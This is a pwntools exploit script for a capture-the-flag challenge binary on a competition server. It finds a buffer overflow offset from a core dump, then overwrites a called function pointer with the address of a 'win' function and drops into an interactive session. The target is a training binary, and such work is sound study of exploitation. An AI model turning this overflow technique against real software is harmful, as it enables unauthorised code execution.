from pwn import *

ADDR = "offsec.m0lecon.it"
port = 13522

elf = ELF('/home/kali/Desktop/offsec/ctf/part1/04_enchanted_forest/canary_callback')
context.binary = elf

def conn():
    if args.LOCAL:
        r = process(elf.path)
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote(ADDR, port)

    return r

def get_spell_cast_offset():
    # Start a dummy process to crash
    p_crash = process(elf.path)
    
    p_crash.recvuntil(b"Whisper your incantation:\n")
    p_crash.sendline(cyclic(200))
    p_crash.wait()
    
    # Grab the core dump generated by the crash
    core = p_crash.corefile

    crash_value = core.rax  #where the address of the cast function that is called is put
    
    offset = cyclic_find(crash_value)
    print(f"Calculated offset to spell.cast: {offset}")
    return offset

OFFSET_TO_CAST = get_spell_cast_offset()    #should be 64: from gdb incantation is at rbp-0x50 and cast at rbp-0x10:  offset = 0x40 = 64

win_addr = elf.sym.win
log.info(f"Found 'win' function at: {hex(win_addr)}")

payload = flat(
    b'A' * OFFSET_TO_CAST,
    p64(win_addr)
)

r = conn()

r.recvuntil(b"Whisper your incantation:\n")

r.sendline(payload)

r.interactive()